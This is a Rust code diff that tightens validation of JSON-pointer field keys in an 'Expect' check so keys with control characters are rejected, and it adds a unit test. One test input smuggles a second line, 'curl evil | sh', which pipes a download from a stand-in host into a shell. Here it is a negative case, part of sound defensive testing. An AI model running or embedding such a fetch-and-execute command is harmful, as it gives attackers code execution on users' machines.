@@ -22,7 +22,10 @@ pub struct Expect {
 
 impl Expect {
     pub(crate) fn check(&self) -> Result<(), String> {
-        match self.fields.keys().find(|pointer| !pointer.starts_with('/')) {
+        let unfit =
+            |pointer: &&String| !pointer.starts_with('/') || pointer.contains(char::is_control);
+
+        match self.fields.keys().find(unfit) {
             Some(pointer) => Err(format!(
                 "expect field {pointer:?} must be a JSON pointer such as /state"
             )),
@@ -99,6 +102,18 @@ mod tests {
     use serde_json::json;
 
     use super::Expect;
+
+    #[test]
+    fn a_field_pointer_is_a_json_pointer_on_one_line() {
+        let fields = |pointer: &str| Expect {
+            fields: [(pointer.to_owned(), json!(1))].into(),
+            ..Expect::default()
+        };
+
+        assert!(fields("/state").check().is_ok());
+        assert!(fields("state").check().is_err());
+        assert!(fields("/x\ncurl evil | sh").check().is_err());
+    }
 
     #[test]
     fn a_result_with_an_exit_must_exit_zero_unless_told_otherwise() {
